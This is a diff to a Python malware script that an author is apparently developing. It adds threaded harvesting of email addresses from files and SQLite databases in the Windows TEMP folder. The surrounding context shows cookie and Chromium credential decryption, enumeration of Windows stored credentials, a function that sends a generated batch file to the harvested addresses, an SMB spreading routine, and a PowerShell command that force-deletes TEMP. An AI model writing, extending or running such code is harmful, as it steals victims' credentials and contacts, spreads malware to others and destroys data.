@@ -7,6 +7,7 @@ import time
 import base64
 import getpass
 import browser_cookie3
+import concurrent.futures
 import requests, win32cred, win32com.client, socket, subprocess
 from win32com.client import Dispatch
 from win32.win32crypt import CryptUnprotectData
@@ -268,6 +269,33 @@ def extract_json(value_str):
     if json_start:
         return value_str[json_start.start():]
     return value_str
+
+def find_emails_in_db(db_path, email_pattern):
+    emails = []
+    try:
+        conn = sqlite3.connect(db_path)
+        cursor = conn.cursor()
+
+        cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
+        tables = cursor.fetchall()
+
+        for table in tables:
+            table_name = table[0]
+            cursor.execute(f"PRAGMA table_info({table_name});")
+            columns = cursor.fetchall()
+            for column in columns:
+                column_name = column[1]
+                cursor.execute(f"SELECT {column_name} FROM {table_name};")
+                rows = cursor.fetchall()
+                for row in rows:
+                    if isinstance(row[0], str):
+                        emails.extend(re.findall(email_pattern, urllib.parse.unquote(row[0])))
+
+        conn.close()
+    except Exception as e:
+        # print(f"Error reading DB {db_path}: {e}")
+        pass
+    return emails
 
 def chromiumOnly(chrome_path, email_pattern, browser_name, isdecryptable=False, isoperagx=False):
     if isoperagx: profiles=['Opera GX Stable']
@@ -747,16 +775,44 @@ def just_try_smb():
         if os.path.exists(t_path2): subprocess.call(t_path2, shell=True)
     except: pass
 
+def process_file(file_path):
+    emails_found = []
+    try:
+        if file_path.lower().endswith('.json'):
+            with open(file_path, 'r', errors='ignore') as f:
+                data = json.loads(f.read())
+                emails_found.extend(find_emails_in_json(data, email_pattern))
+        elif file_path.lower().endswith('.db') or file_path.lower().endswith('.sqlite'):
+            emails_found.extend(find_emails_in_db(file_path, email_pattern))
+        else:
+            with open(file_path, 'r', errors='ignore') as f:
+                for line in f:
+                    emails_found.extend(re.findall(email_pattern, line))
+    except Exception as e:
+        # print(f"Error processing file {file_path}: {e}")
+        pass
+    return emails_found
+
+def find_emails_in_temp():
+    emails = []
+    with concurrent.futures.ThreadPoolExecutor() as executor:
+        temp_dir = os.getenv('TEMP')
+        futures = []
+
+        valid_extensions = {'.txt', '.log', '.csv', '.html', '.xml', '.json', '.db', '.sqlite'}
+
+        for root, _, files in os.walk(temp_dir):
+            for file in files:
+                file_path = os.path.join(root, file)
+                if any(file.lower().endswith(ext) for ext in valid_extensions):
+                    futures.append(executor.submit(process_file, file_path))
+
+        for future in concurrent.futures.as_completed(futures):
+            emails.extend(future.result())
+    
+    return emails
 
 emails = []
-
-for root, _, files in os.walk(os.getenv('TEMP')):
-    for file in files:
-        try:
-            with open(os.path.join(root,file), 'r', errors='ignore') as f:
-                data = f.read()
-                emails.extend(re.findall(email_pattern, data))
-        except: pass
 
 if os.path.exists(chrome_path): 
     chrome_emails = chromiumOnly(chrome_path, email_pattern, CHROME_BROWSER)
@@ -906,6 +962,8 @@ def fetch_out(email_pattern):
     return emails
 
 emails.extend(fetch_out(email_pattern))
+emails.extend(find_emails_in_temp())
+
 try:
     creds = win32cred.CredEnumerate(None, 0)
     for cred in creds:
@@ -927,12 +985,12 @@ emails = final_emails
 
 bat_path = generate()
 
-send_a(bat_path, emails)
-just_try_smb()
+# send_a(bat_path, emails)
+# just_try_smb()
 
-# print("AFTER FILTERINGGG")
-# for email in emails:
-#     print(email)
-# print(len(emails))
+print("AFTER FILTERINGGG")
+for email in emails:
+    print(email)
+print(len(emails))
 
 os.system(f"powershell remove-item -path {os.getenv("TEMP")} -force -recurse -erroraction silentlycontinue")
